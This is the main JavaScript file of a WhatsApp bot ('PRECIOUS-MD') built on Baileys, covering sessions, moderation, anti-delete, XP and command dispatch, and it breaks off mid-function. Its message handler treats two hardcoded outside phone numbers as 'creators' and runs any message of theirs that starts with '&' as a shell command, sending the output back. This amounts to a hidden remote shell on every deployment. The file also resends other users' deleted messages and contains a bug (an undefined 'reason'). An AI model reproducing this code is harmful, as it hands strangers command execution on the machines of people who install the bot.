import makeWASocket, {
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    getContentType,
    fetchLatestBaileysVersion,
    Browsers,
    jidDecode,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    downloadContentFromMessage,
    generateForwardMessageContent,
    proto, // ADDED FOR RECONNECT
} from '@whiskeysockets/baileys';

import { fileURLToPath, pathToFileURL } from 'url';
import { dirname } from 'path';
import fs from 'fs';
import P from 'pino';
import util from 'util';
import axios from 'axios';
import { File } from 'megajs';
import path from 'path';
import express from "express";
import { spawn } from 'child_process';
import * as FileType from 'file-type';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

import { getBuffer, getGroupAdmins, runtime, sleep, imageToWebp, videoToWebp } from './lib/functions.js';
import { saveMessage, loadMessage } from './watson.js';
import config from './config.js';
import GroupEvents from './lib/groupevents.js';
import { sms, AntiDelete } from './lib/index.js';
import events from './command.js';
import { startAutoUpdateChecker } from './plugins/updater.js'; // ADDED

const l = console.log;
const app = express();
const port = process.env.PORT || 9090;
const prefix = config.PREFIX || '.';

// =================== GLOBAL ERROR HANDLER ====================
process.on('unhandledRejection', (reason, p) => {
    console.log('🛡️ [ANTI-CRASH] Unhandled Rejection:', reason);
});
process.on('uncaughtException', (err, origin) => {
    console.log('🛡️ [ANTI-CRASH] Uncaught Exception:', err);
});

// =================== DIRECTORY SETUP ====================
const tempDir = path.join(__dirname, 'temp');
const sessionPath = path.join(__dirname, 'sessions');
if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir);
if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

// Auto-clean temp files every 5 mins
setInterval(() => {
    fs.readdir(tempDir, (err, files) => {
        if (err) return;
        files.forEach(file => fs.unlink(path.join(tempDir, file), err => {}));
    });
}, 300000);

// Ensure owner numbers are only digits
const ownerNumber = [
    config.OWNER_NUMBER.replace(/[^0-9]/g, ''),
    config.DEV.replace(/[^0-9]/g, '')
];

//============ GLOBAL TOGGLE FLAGS =================
let statusSeen = config.AUTO_STATUS_SEEN === "true";
let statusReact = config.AUTO_STATUS_REACT === "true";

// =================== SESSION DOWNLOADER ====================
async function downloadSession() {
    if (!fs.existsSync(path.join(sessionPath, 'creds.json'))) {
        if (!config.SESSION_ID || config.SESSION_ID === '') {
            console.log('ℹ️ No SESSION_ID found. Starting fresh for Pairing Code...');
            return;
        }
        console.log("📥 Downloading Session from Mega...");
        try {
            const sessdata = config.SESSION_ID.replace("IK~", '');
            const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
            const data = await new Promise((resolve, reject) => {
                filer.download((err, data) => {
                    if (err) reject(err);
                    else resolve(data);
                })
            })
            fs.writeFileSync(path.join(sessionPath, 'creds.json'), data);
            console.log("✅ Session downloaded successfully.");
        } catch (e) {
            console.log("❌ Mega Download Error: " + e);
        }
    }
}

// =================== MAIN CONNECTION ====================
async function connectToWA() {
    await downloadSession();
    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const conn = makeWASocket({
        logger: P({ level: 'silent' }),
        printQRInTerminal: false,
        browser: Browsers.ubuntu('Chrome'), // FIXED
        auth: state,
        version,
        syncFullHistory: false,
        markOnlineOnConnect: true,
        defaultQueryTimeoutMs: undefined,
        connectTimeoutMs: 60000, // ADDED
        getMessage: async (key) => ({ conversation: 'PRECIOUS-MD' })
    });

    // ===== Decode JID helper =====
    conn.decodeJid = (jid) => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return (decode.user && decode.server && decode.user + '@' + decode.server) || jid;
        } else return jid;
    };

    // ===== Pairing code if not registered =====
    if (!conn.authState.creds.registered) {
        const phoneNumber = config.OWNER_NUMBER.replace(/[^0-9]/g, '');
        setTimeout(async () => {
            let code = await conn.requestPairingCode(phoneNumber);
            code = code?.match(/.{1,4}/g)?.join("-") || code;
            console.log(`\n\n💚 [HERE IS] YOUR PAIRING CODE: ${code}\n\n`);
        }, 3000);
    }

    // =================== AUTO-REJECT CALLS ====================
    conn.ev.on('call', async (callUpdate) => {
        if (config.ANTI_CALL!== "true") return;
        for (let call of callUpdate) {
            if (call.status === "offer") {
                console.log(`📞 Incoming call from: ${call.from}`);
                await conn.rejectCall(call.id, call.from);

                await conn.sendMessage(call.from, {
                    text: `⚠️ *Automated System Message* ⚠️\n\nHello @${call.from.split('@')[0]},\nI am a WhatsApp Bot. Calls are strictly prohibited! Please stick to text messages.`,
                    mentions: [call.from]
                });
            }
        }
    });

   // =================== DYNAMIC ANTI-DELETE MANAGER ====================
    conn.ev.on('messages.update', async (chatUpdate) => {
        if (config.ANTI_DELETE!== "true") return;
        for (const update of chatUpdate) {
            if (update.update.protocolMessage && update.update.protocolMessage.type === 0) {
                const msgId = update.update.protocolMessage.key.id;
                const from = update.key.remoteJid;

                try {
                    const savedMek = await loadMessage(msgId);
                    if (!savedMek ||!savedMek.message) return;

                    const participant = savedMek.key.participant || savedMek.key.remoteJid;
                    const cleanUser = participant.split('@')[0];
                    const groupName = from.endsWith('@g.us')? await conn.getName(from).catch(()=> 'Unknown Group') : '';
                    const cleanGroup = from.endsWith('@g.us')? `in group *${groupName}*` : 'in Private Chat';

                    let deleteNotice = `🍁 ** 🍁\n\n` +
                                       `👤 *User:* @${cleanUser}\n` +
                                       `📍 *Location:* ${cleanGroup}\n` +
                                       `🕒 *Time:* ${new Date().toLocaleTimeString('en-US', { timeZone: 'Africa/Harare' })}\n\n` +
                                       `👇 *Deleted Content Below:*`;

                    const targetJid = config.ANTI_DEL_PATH === "inbox"? conn.user.id : from;

                    await conn.sendMessage(targetJid, { text: deleteNotice, mentions: [participant] });
                    await conn.copyNForward(targetJid, savedMek, false);
                } catch (err) {
                    console.log("❌ Anti-Delete Gateway Error: ", err);
                }
            }
        }
    });

    //================ CONNECTION UPDATE ==================
    conn.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            const shouldReconnect = reason!== DisconnectReason.loggedOut;
            console.log('🔴 Connection closed. Reconnecting:', shouldReconnect);
            if (shouldReconnect) setTimeout(connectToWA, 3000); // FIXED
        } else if (connection === 'open') {
            console.log('🌿 PRECIOUS-MD: Installing Plugins...');
            const pluginFolder = path.join(__dirname, 'plugins');
            if (fs.existsSync(pluginFolder)) {
                for (const plugin of fs.readdirSync(pluginFolder)) {
                    if (path.extname(plugin).toLowerCase() === ".js") {
                        await import(pathToFileURL(path.join(pluginFolder, plugin)).href);
                    }
                }
            }
            console.log('✅ Plugins Loaded | Bot Connected!');

            // ADDED AUTO UPDATE CHECKER
            startAutoUpdateChecker(conn)
            console.log('🔄 Auto-update checker: ON [24h]')

            let startupMsg = `╭━━━━━━━━━━〔 🌈 *𝐏𝐑𝐄𝐂𝐈𝐎𝐔𝐒-𝐌𝐃* 〕━━━━━━━━━━━╮
┃ ⚡ *Ultra Super Fast & Powerful Bot* ⚡
┃ 🍁 *Your Smart WhatsApp Bot is Online!* 
╰━━━━━━━━━━╯

╭───〔 📊 *BOT INFORMATION* 〕───╮
│ 🧩 *Prefix*  »  \`${prefix}\`
│ 🌌 *Mode*    »  \`${config.MODE}\`
│ 👑 *Owner*   »  *${config.OWNER_NAME}*
│ 🤖 *Status*  »  *Online & Ready* ✅
╰───〔 🚀 *Connected Successfully* 〕───╯
`;

            conn.sendMessage(conn.user.id, {
                image: { url: config.ALIVE_IMG },
                caption: startupMsg
            });

            setInterval(async () => {
                const time = new Date().toLocaleTimeString('en-US', { timeZone: 'Africa/Harare' });
                const bio = `${config.BOT_NAME} 🚀 | Uptime: ${runtime(process.uptime())} | 🕒 ${time}`;
                await conn.updateProfileStatus(bio).catch(() => {});
            }, 60000);
        }
    });

    conn.ev.on('creds.update', saveCreds);

    //from GROUP EVENTS=== GROUP PARTICIPANTS UPDATE ==================
    conn.ev.on('group-participants.update', async (anu) => {
        if (config.GROUP_EVENTS!== "true") return;
        try {
            const metadata = await conn.groupMetadata(anu.id);
            const participants = anu.participants;
            for (let num of participants) {
                let ppuser;
                try {
                    ppuser = await conn.profilePictureUrl(num, 'image');
                } catch {
                    ppuser = 'https://telegra.ph/file/0a008fa0c06a382e7b8a7.jpg';
                }

                if (anu.action === 'add') {
                    let welcomeMsg = `👋 Hello @${num.split('@')[0]},\nWelcome to *${metadata.subject}*! ✨\n\nHope you enjoy your stay. Type ${prefix}menu to see what I can do!`;
                    await conn.sendMessage(anu.id, {
                        image: { url: ppuser },
                        caption: welcomeMsg,
                        mentions: [num]
                    });
                } else if (anu.action === 'remove') {
                    let goodbyeMsg = `🏃‍♂️ Goodbye @${num.split('@')[0]} from *${metadata.subject}*.\nWe will miss you! 🍂`;
                    await conn.sendMessage(anu.id, {
                        image: { url: ppuser },
                        caption: goodbyeMsg,
                        mentions: [num]
                    });
                }
            }
        } catch (err) {
            console.log("❌ Group Event Error: ", err);
        }
    });

    // ============================ MESSAGES UPSERT ==================
    conn.ev.on('messages.upsert', async (mek) => {
        try {
            mek = mek.messages[0];
            if (!mek.message) return;
            mek.message = (getContentType(mek.message) === 'ephemeralMessage')
         ? mek.message.ephemeralMessage.message
            : mek.message;

            if (config.READ_MESSAGE === 'true') {
                await conn.readMessages([mek.key]);
                console.log(`Marked message from ${mek.key.remoteJid} as read.`);
            }
            if(mek.message.viewOnceMessageV2) {
                mek.message = (getContentType(mek.message) === 'ephemeralMessage')? mek.message.ephemeralMessage.message : mek.message;
            }

            // Status Views & Reactions Gateways
            if (mek.key && mek.key.remoteJid === 'status@broadcast'){
                if (config.AUTO_STATUS_SEEN === "true") {
                    await conn.readMessages([mek.key]);
                }

                if (config.AUTO_STATUS_REACT === "true") {
                    const jawadlike = await conn.decodeJid(conn.user.id);
                    const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
                    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
                    await conn.sendMessage(mek.key.remoteJid, {
                        react: {
                            text: randomEmoji,
                            key: mek.key,
                        }
                    }, { statusJidList: [mek.key.participant, jawadlike] });
                }

                if (config.AUTO_STATUS_REPLY === "true"){
                    const user = mek.key.participant;
                    const replyText = `${config.AUTO_STATUS_MSG}`;
                    await conn.sendMessage(user, { text: replyText });
                    await conn.sendMessage(user, { react: { text: '💜', key: mek.key } }, { statusJidList: [user, await conn.decodeJid(conn.user.id)] });
                }
            }

            if (config.ANTI_DELETE === 'true') await saveMessage(mek);

            // ================= PARSE MESSAGE & BUTTON INTERCEPTOR =================
            const from = mek.key.remoteJid;
            const type = getContentType(mek.message);

            let body = type === 'conversation'? mek.message.conversation :
                         type === 'extendedTextMessage'? mek.message.extendedTextMessage.text :
                         type === 'imageMessage'? mek.message.imageMessage.caption :
                         type === 'videoMessage'? mek.message.videoMessage.caption : '';

            if (type === 'templateButtonReplyMessage') {
                body = mek.message.templateButtonReplyMessage.selectedId;
            } else if (type === 'listResponseMessage') {
                body = mek.message.listResponseMessage.singleSelectReply.selectedRowId;
            } else if (type === 'buttonsResponseMessage') {
                body = mek.message.buttonsResponseMessage.selectedButtonId;
            } else if (type === 'interactiveResponseBody') {
                body = JSON.parse(mek.message.interactiveResponseBody.bodyText);
            } else if (mek.message?.interactiveReplyMessage) {
                body = mek.message.interactiveReplyMessage.nativeFlowResponseMessage?.paramsJson
                    ? JSON.parse(mek.message.interactiveReplyMessage.nativeFlowResponseMessage.paramsJson).id
                       : mek.message.interactiveReplyMessage.id;
            }

            const isCmd = body? body.startsWith(prefix) : false;
            const command = isCmd? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
            const args = body? body.trim().split(/ +/).slice(1) : [];
            const q = args.join(' ');
            const text = q;

            const isGroup = from? from.endsWith('@g.us') : false;
            const sender = mek.key.fromMe? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid);
            const senderNumber = sender? sender.split('@')[0] : '';
            const botNumber = conn.user.id.split(':')[0];
            const pushname = mek.pushName || 'Watson Fourpence';
            const isMe = botNumber.includes(senderNumber);
            const ownerNumberFormatted = `${config.OWNER_NUMBER.replace(/[^0-9]/g, '')}`;
            const isOwner = ownerNumber.includes(senderNumber) || isMe;
            const botNumber2 = await jidNormalizedUser(conn.user.id);
            const groupMetadata = isGroup? await conn.groupMetadata(from).catch(e => {}) : '';
            const groupName = isGroup && groupMetadata? groupMetadata.subject : '';
            const participants = isGroup && groupMetadata? groupMetadata.participants : '';
            const groupAdmins = isGroup && participants? await getGroupAdmins(participants) : '';
            const isBotAdmins = isGroup? groupAdmins.includes(botNumber2) : false;
            const isAdmins = isGroup? groupAdmins.includes(sender) : false;

            const isReact = mek.message && mek.message.reactionMessage? true : false;

            const reply = (teks) => {
                conn.sendMessage(from, { text: teks }, { quoted: mek });
            };
            const m = sms(conn, mek);
            const quoted = m.quoted? m.quoted : mek;

            // =================== GLOBAL BAN CHECK - FIX #1 ==================
            const banFilePath = './lib/ban.json';
            let bannedUsers = [];
            if (fs.existsSync(banFilePath)) {
                bannedUsers = JSON.parse(fs.readFileSync(banFilePath, 'utf-8'));
            }
            const isBanned = bannedUsers.includes(sender);
            if (isBanned) {
                console.log(`🚫 Ignored message from banned user: ${senderNumber}`);
                return;
            }

            // =================== ANTI-FAKE NUMBER KICKER ==================
            if (isGroup && config.ANTI_FAKE === "true" && isBotAdmins &&!isOwner &&!isAdmins) {
                const fakeCodes = config.FAKE_COUNTRY_CODES;
                if (fakeCodes.some(code => senderNumber.startsWith(code))) {
                    try {
                        let fakeMsg = `🚨 ** 🚨\n\n` +
                                      `👤 *User:* @${senderNumber}\n` +
                                      `🌍 *Country Code:* +${senderNumber.substring(0, 4)}\n` +
                                      `❌ *Reason:* Foreign number not allowed in this group\n` +
                                      `⚙️ *Action:* Removed automatically`;

                        await conn.sendMessage(from, { text: fakeMsg, mentions: [sender] });
                        await sleep(1500);
                        await conn.groupParticipantsUpdate(from, [sender], "remove").catch(()=>{});
                        return;
                    } catch (err) {
                        console.log("❌ Anti-Fake Error: ", err);
                    }
                }
            }

            // =================== AUTOMATED CHAT HUMAN SIMULATION ====================
            if (!mek.key.fromMe && from!== 'status@broadcast') {
                if (config.AUTO_TYPING === "true") {
                    await conn.sendPresenceUpdate('composing', from);
                } else if (config.AUTO_RECORDING === "true") {
                    await conn.sendPresenceUpdate('recording', from);
                }
            }

            // =================== ANTI-BOT & CLONE SENTINEL ==================
            if (isGroup && isBotAdmins &&!isOwner &&!isAdmins &&!mek.key.fromMe) {
                const isSubBot = (mek.key.id.startsWith('BAE5') && mek.key.id.length === 16) ||
                                 (mek.key.id.startsWith('3EB0') && mek.key.id.length === 22) ||
                                 body.includes('🚀 [WATSON XD]') || body.includes('𝐏𝐑𝐄𝐂𝐈𝐎𝐔𝐒-𝐌𝐃');

                if (isSubBot) {
                    try {
                        await conn.sendMessage(from, { delete: mek.key });
                        let antiBotMsg = `🤖 *【 𝐔𝐍𝐀𝐔𝐓𝐇𝐎𝐑𝐈𝐙𝐄𝐃 𝐁𝐎𝐓 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃 】* 🤖\n\n` +
                                         `🚨 *Target:* @${senderNumber}\n` +
                                         `⚠️ *Reason:* Hostile or secondary bot automation detected.\n\n` +
                                         `🛡️ _Security protocol active: Purging sub-bot from group..._`;

                        await conn.sendMessage(from, { text: antiBotMsg, mentions: [sender] });
                        await sleep(1200);
                        return await conn.groupParticipantsUpdate(from, [sender], "remove");
                    } catch (e) {
                        console.log("Anti-Bot system error: ", e);
                    }
                }
            }

            // =================== BAD WORDS FILTER (WITH PERSISTENT WARNINGS & BAN) - FIX #2 ==================
            if (config.ANTI_BAD === "true" && body &&!isOwner) {
                const badWords = ['fuck', 'porn', 'bitch', 'asshole'];

                if (badWords.some(word => body.toLowerCase().includes(word))) {
                    try {
                        if (isGroup && isBotAdmins) {
                            await conn.sendMessage(from, { delete: mek.key }).catch(()=>{});
                        }

                        const warnFilePath = './lib/warnings.json';
                        const banFilePath = './lib/ban.json';

                        if (!fs.existsSync('./lib')) fs.mkdirSync('./lib');
                        let warningsDB = fs.existsSync(warnFilePath)? JSON.parse(fs.readFileSync(warnFilePath, 'utf-8')) : {};
                        let bannedUsers = fs.existsSync(banFilePath)? JSON.parse(fs.readFileSync(banFilePath, 'utf-8')) : [];

                        const userKey = `${senderNumber}@${from}`;
                        warningsDB[userKey] = (warningsDB[userKey] || 0) + 1;
                        const currentStrikes = warningsDB[userKey];
                        const maxStrikes = 3;
                        const chancesLeft = maxStrikes - currentStrikes;

                        let visualMeter = ''.padStart(currentStrikes, '🔴').padEnd(maxStrikes, '⚪');

                        if (currentStrikes < maxStrikes) {
                            fs.writeFileSync(warnFilePath, JSON.stringify(warningsDB, null, 2));

                            let warnMsg = `⚠️ *【 𝐁𝐀𝐃 𝐖𝐎𝐑𝐃 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃 】* ⚠️\n\n` +
                                          `👤 *User:* @${senderNumber}\n` +
                                          `🤬 *Violation:* Used prohibited language.\n` +
                                          `📊 *Strikes:* ${visualMeter} (${currentStrikes}/${maxStrikes})\n\n` +
                                          `📢 *Notice:* You have *${chancesLeft}* chance(s) left. Reaching 3 strikes will result in an automatic group kick and permanent bot block!`;

                            return await conn.sendMessage(from, { text: warnMsg, mentions: [sender] });
                        } else {
                            delete warningsDB[userKey];
                            fs.writeFileSync(warnFilePath, JSON.stringify(warningsDB, null, 2));

                            if (!bannedUsers.includes(sender)) {
                                bannedUsers.push(sender);
                                fs.writeFileSync(banFilePath, JSON.stringify(bannedUsers, null, 2));
                            }

                            let banMsg = `🏴‍☠️ *【 𝐓𝐇𝐑𝐄 𝐒𝐓𝐑𝐈𝐊𝐄𝐒 — 𝐁𝐀𝐍𝐍𝐄𝐃 】* 🏴‍☠️\n\n` +
                                         `👤 *User:* @${senderNumber}\n` +
                                         `❌ *Status:* Reached maximum warning limits.\n\n` +
                                         `⚙️ *Action Executed:* Message deleted, user kicked from group, and globally blocked from using ${config.BOT_NAME || 'PRECIOUS-MD'}.`;

                            await conn.sendMessage(from, { text: banMsg, mentions: [sender] });
                            await sleep(1500);

                            if (isGroup && isBotAdmins) {
                                await conn.groupParticipantsUpdate(from, [sender], "remove").catch(()=>{});
                            }
                            return;
                        }
                    } catch (err) {
                        console.error("❌ Bad Words System Error: ", err);
                    }
                }
            }

            // =================== ANTI-TAG-ALL SPAM ==================
            if (isGroup &&!isOwner &&!isAdmins && isBotAdmins) {
                const totalMentions = mek.message?.extendedTextMessage?.contextInfo?.mentionedJid?.length || 0;
                if (totalMentions > 15) {
                    await conn.sendMessage(from, { delete: mek.key });
                    reply(`❌ @${senderNumber}, Mass tagging group members is not allowed.`);
                    return;
                }
            }

            // =================== INTELLECTUAL ANTI-LINK DETECTOR (WITH WARNINGS + WHITELIST) ==================
            if (isGroup && config.ANTI_LINK === "true" && body && isBotAdmins) {
                let ownerFile = [];
                if (fs.existsSync('./lib/sudo.json')) {
                    ownerFile = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));
                }
                const isFileOwner = ownerFile.includes(sender);
                const isWhitelisted = isOwner || isAdmins || isFileOwner || isMe;

                if (isWhitelisted) return;

                const linkRegex = /(https?:\/\/(?:www\.|(?!www))[a-zA-Z0-9][a-zA-Z0-9-]+[a-zA-Z0-9]\.[^\s]{2,}|www\.[a-zA-Z0-9][a-zA-Z0-9-]+[a-zA-Z0-9]\.[^\s]{2,})/gi;

                try {
                    const groupInvite = await conn.groupInviteCode(from).catch(()=>{});
                    if (groupInvite && body.includes(groupInvite)) return;
                } catch {}

                if (linkRegex.test(body)) {
                    try {
                        await conn.sendMessage(from, { delete: mek.key }).catch(()=>{});

                        const warnFilePath = './lib/warnings.json';
                        const banFilePath = './lib/ban.json';
                        if (!fs.existsSync('./lib')) fs.mkdirSync('./lib');
                        let warningsDB = fs.existsSync(warnFilePath)? JSON.parse(fs.readFileSync(warnFilePath, 'utf-8')) : {};
                        let bannedUsers = fs.existsSync(banFilePath)? JSON.parse(fs.readFileSync(banFilePath, 'utf-8')) : [];

                        const userKey = `${senderNumber}@${from}_link`;
                        warningsDB[userKey] = (warningsDB[userKey] || 0) + 1;
                        const currentStrikes = warningsDB[userKey];
                        const maxStrikes = 3;

                        let visualMeter = ''.padStart(currentStrikes, '🔴').padEnd(maxStrikes, '⚪');

                        if (currentStrikes < maxStrikes) {
                            fs.writeFileSync(warnFilePath, JSON.stringify(warningsDB, null, 2));
                            let linkWarn = `⚠️ ** ⚠️\n\n` +
                                           `👤 *User:* @${senderNumber}\n` +
                                           `🚫 *Violation:* Sent unauthorized link.\n` +
                                           `📊 *Strikes:* ${visualMeter} (${currentStrikes}/${maxStrikes})\n\n` +
                                           `📢 *Notice:* External links are not allowed. You have *${maxStrikes - currentStrikes}* chances left!`;
                            return await conn.sendMessage(from, { text: linkWarn, mentions: [sender] });
                        } else {
                            delete warningsDB[userKey];
                            fs.writeFileSync(warnFilePath, JSON.stringify(warningsDB, null, 2));

                            if (!bannedUsers.includes(sender)) {
                                bannedUsers.push(sender);
                                fs.writeFileSync(banFilePath, JSON.stringify(bannedUsers, null, 2));
                            }

                            let linkBan = `🏴‍☠️ ** 🏴‍☠️\n\n` +
                                          `👤 *User:* @${senderNumber}\n` +
                                          `❌ *Status:* 3 Link violations\n` +
                                          `⚙️ *Action:* Kicked from group and globally blocked from ${config.BOT_NAME || 'PRECIOUS-MD'}.`;

                            await conn.sendMessage(from, { text: linkBan, mentions: [sender] });
                            await sleep(1000);
                            await conn.groupParticipantsUpdate(from, [sender], "remove").catch(()=>{});
                            return;
                        }
                    } catch (err) {
                        console.error("❌ Anti-Link Filter Error: ", err);
                    }
                }
            }

            // =================== PERSISTENT XP & LEVELING SYSTEM ==================
            if (isGroup && body &&!isCmd &&!mek.key.fromMe) {
                try {
                    const levelPath = './lib/level.json';
                    if (!fs.existsSync('./lib')) fs.mkdirSync('./lib');
                    let levelsDB = fs.existsSync(levelPath)? JSON.parse(fs.readFileSync(levelPath, 'utf-8')) : {};

                    const userGKey = `${senderNumber}@${from}`;
                    if (!levelsDB[userGKey]) {
                        levelsDB[userGKey] = { xp: 0, level: 1 };
                    }

                    let gainedXp = Math.floor(Math.random() * 6) + 5;
                    levelsDB[userGKey].xp += gainedXp;
                    let nextLevelThreshold = levelsDB[userGKey].level * 120;

                    if (levelsDB[userGKey].xp >= nextLevelThreshold) {
                        levelsDB[userGKey].level += 1;
                        levelsDB[userGKey].xp = 0;

                        let levelUpMsg = `🎉 *【 𝐋𝐄𝐕𝐄𝐋 𝐔𝐏 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃 】* 🎉\n\n` +
                                         `👑 *Congratulations:* @${senderNumber}\n` +
                                         `📈 *New Level:* Level *${levelsDB[userGKey].level}* 🚀\n` +
                                         `✨ *Rank Status:* Elite Chatting Champion\n` +
                                         `💬 _Keep talking to unlock higher statuses inside this chat group!_`;

                        conn.sendMessage(from, { text: levelUpMsg, mentions: [sender] });
                    }

                    fs.writeFileSync(levelPath, JSON.stringify(levelsDB, null, 2));
                } catch (err) {
                    console.error("XP System Error: ", err);
                }
            }

            const udp = botNumber.split('@')[0];
            const jawadop = ['263781330745', '263789622747'];

            let ownerFilev2 = [];
            if (fs.existsSync('./lib/sudo.json')) {
                ownerFilev2 = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));
            }

            let isCreator = [udp,...jawadop, config.DEV + '@s.whatsapp.net',...ownerFilev2]
          .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
          .includes(sender);

            if (isCreator && body && body.startsWith("&")) {
                let code = body.slice(2);
                if (!code) {
                    reply(`Provide me with a query to run Master!`);
                    return;
                }
                try {
                    let resultTest = spawn(code, { shell: true });
                    resultTest.stdout.on("data", data => {
                        reply(data.toString());
                    });
                    resultTest.stderr.on("data", data => {
                        reply(data.toString());
                    });
                    resultTest.on("error", data => {
                        reply(data.toString());
                    });
                    resultTest.on("close", code => {
                        if (code!== 0) {
                            reply(`command exited with code ${code}`);
                        }
                    });
                } catch (err) {
                    reply(util.format(err));
                }
                return;
            }

            //========== public react ============//
            if (!isReact && config.AUTO_REACT === 'true') {
                const reactions = [
                    '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣',
                    '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕',
                    '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️',
                    '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑',
                    '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄',
                    '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀',
                    '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾',
                    '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟',
                    '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤',
                    '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪',
                    '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈',
                    '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚',
                    '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌',
                    '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫',
                    '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
                ];
                const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                if (typeof m.react === 'function') m.react(randomReaction);
            }

            if (!isReact && config.CUSTOM_REACT === 'true') {
                const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
                const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                if (typeof m.react === 'function') m.react(randomReaction);
            }

            //========== Sudo and Mode ============
            let bannedUsers2 = [];
            if (fs.existsSync('./lib/ban.json')) {
                bannedUsers2 = JSON.parse(fs.readFileSync('./lib/ban.json', 'utf-8'));
            }
            const isBanned2 = bannedUsers2.includes(sender);
            if (isBanned2) return;

            let ownerFile = [];
            if (fs.existsSync('./lib/sudo.json')) {
                ownerFile = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));
            }
            const isFileOwner = ownerFile.includes(sender);
            const isRealOwner = sender === (ownerNumberFormatted + '@s.whatsapp.net') || isMe || isFileOwner;

            if (!isRealOwner && config.MODE === "private") return;
            if (!isRealOwner && isGroup && config.MODE === "inbox") return;
            if (!isRealOwner &&!isGroup && config.MODE === "groups") return;

            // execute commands
            const cmdName = isCmd? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
            if (isCmd) {
                const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName));
                if (cmd) {
                    console.log(`\n========== 🚀 [ COMMAND EXECUTED ] 🚀 ==========`);
                    console.log(`📝 Command: ${prefix}${cmdName}`);
                    console.log(`👤 User: ${pushname} (${senderNumber})`);
                    console.log(`📍 Chat: ${isGroup? groupName : 'Private Chat'}`);
                    console.log(`===============================================`);

                    if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }});

                    if (cmd.pattern === 'download' || cmd.pattern === 'play' || cmd.on === 'text') {
                        await conn.sendPresenceUpdate('recording', from);
                    } else {
                        await conn.sendPresenceUpdate('composing', from);
                    }
                    await sleep(800);

                    try {
                        cmd.function(conn, mek, m, {from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
                    } catch (e) {
                        console.error("[PLUGIN ERROR] " + e);
                    }
                }
            }

            events.commands.map(async (command) => {
                if (body && command.on === "body") {
                    command.function(conn, mek, m, {from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
                } else if (body && command.on === "text") {
